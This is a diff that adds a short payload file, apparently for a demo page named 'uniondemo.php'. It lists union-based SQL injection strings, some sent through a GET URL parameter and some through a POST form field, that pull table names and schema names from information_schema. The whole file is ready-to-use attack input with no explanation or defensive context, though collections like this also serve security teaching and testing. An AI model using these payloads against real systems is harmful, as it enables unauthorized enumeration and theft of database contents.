@@ -1,0 +1,13 @@
+
+
+GET Method (URL)
+
+<URL>/uniondemo.php?Selection=2 UNION SELECT 1,table_name,3 FROM information_schema.tables
+<URL>/uniondemo.php?Selection=2 UNION SELECT 1,table_schema,table_name FROM information_schema.tables where table_schema = database()
+
+
+
+POST Method (Form Input):
+
+Audi' UNION SELECT 1,2,table_name,4,5 FROM information_schema.tables #
+Audi' UNION SELECT 1,2,3,table_schema,table_name FROM information_schema.tables; #
